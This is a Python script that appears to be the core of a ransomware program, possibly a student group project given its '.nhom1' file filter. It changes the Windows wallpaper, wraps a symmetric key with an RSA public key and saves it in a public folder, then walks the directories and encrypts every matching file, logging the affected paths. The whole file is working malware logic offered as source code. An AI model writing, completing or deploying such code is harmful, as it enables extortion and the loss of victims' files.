from cryptography.hazmat.primitives import serialization as crypto_serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend as crypto_default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
import screens.home_screen as home_screen
import services.get_dirs as get_dirs
import encrypt.encrypt_file as enc
import os
import ctypes
import shutil

def copy_image(src_path, dst_path):
  shutil.copy(src_path, dst_path)

# Usage
copy_image('assets/wal.jpg', 'C:\\Users\\Public\\Documents')

# Set the path of the wallpaper image
# wallpaper_path = "C:\\Users\\Public\\Documents\\wal.jpg"
wallpaper_path = "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg"
# Set the style of the wallpaper
# 0: Center, 1: Stretch, 2: Tile, 6: Fit
wallpaper_style = 1

# Load the image
SPI_SETDESKWALLPAPER = 20
image = ctypes.c_wchar_p(wallpaper_path)

# Set the wallpaper
ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image, wallpaper_style)

# get all dirs
all_dirs = get_dirs.get_all_dirs()
DONT_DELETE = 'C:\\Users\\Public\\Documents\\DONT_DELETE.txt'
KEY_FILE = 'C:\\Users\\Public\\Documents\\KEY_FILE.txt'

all_files_enc = open(DONT_DELETE, '+a')


if not os.path.exists(KEY_FILE):
  base64_key = enc.get_key()[0]

  with open("public.pem", "rb") as key_file:
    public_key = serialization.load_pem_public_key(
      key_file.read(),
      backend=crypto_default_backend()
    )

  ciphertext = public_key.encrypt(
    base64_key,
    padding.OAEP(
      mgf=padding.MGF1(algorithm=hashes.SHA256()),
      algorithm=hashes.SHA256(),
      label=None
    )
  )

  with open(KEY_FILE, 'wb') as enc_key_file:
    rsa_pri_key = enc_key_file.write(ciphertext)


for direc in all_dirs:
  for root, _, filenames in os.walk(direc):
    for filename in filenames:
      file_path = os.path.join(root, filename)
      if file_path.endswith('.nhom1'):
        all_files_enc.write(str(file_path) + '.enc' + '\n')
        enc.enc(key=base64_key, filename=file_path)

all_files_enc.close()
home_screen = home_screen.root
home_screen.mainloop()